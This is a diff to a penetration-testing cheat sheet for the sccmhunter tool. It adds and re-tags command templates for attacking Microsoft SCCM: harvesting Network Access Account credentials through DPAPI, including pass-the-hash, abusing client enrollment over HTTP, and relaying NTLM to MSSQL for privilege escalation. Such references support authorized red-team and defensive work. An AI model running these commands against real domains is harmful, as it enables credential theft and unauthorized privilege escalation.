@@ -1,7 +1,7 @@
 # sccmhunter
 
 % sccm, mecm
-#plateform/linux  #target/remote  #cat/ATTACK 
+#plateform/linux  #target/remote #cat/RECON 
 
 ## desc
 ```
@@ -38,18 +38,26 @@ python3 sccmhunter.py smb -debug  -u <user> -p <password> -d <domain_fqdn> -dc-i
 python3 sccmhunter.py show  -all
 ```
 
-## DPAPI - naa (cred local admin)
+
+#cat/ATTACK 
+
+## harvest naa - DPAPI (cred local admin)
 ```bash
 python3 sccmhunter.py dpapi -debug  -u <user>  -p '<password>' -target <target_ip>
 ```
 
 
-## DPAPI - naa (pth local admin)
+## harvest naa - DPAPI (pth local admin)
 ```bash
 python3 sccmhunter.py dpapi -debug  -u <user>  -hashes :<nt_hash> -target <target_ip>
 ```
 
-## http - 
+## harvest naa - http (abuse client enrollment)
 ```bash
 python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep <sleep|10> -auto
+```
+
+## privesc - ntlmrelay to mssql helper
+```bash
+python3 sccmhunter.py mssql -stacked -d <domain_fqdn -dc-ip <dc_fqdn> -tu <target_user> -sc <sccm_site_code> -u <user> -p '<password>'
 ```
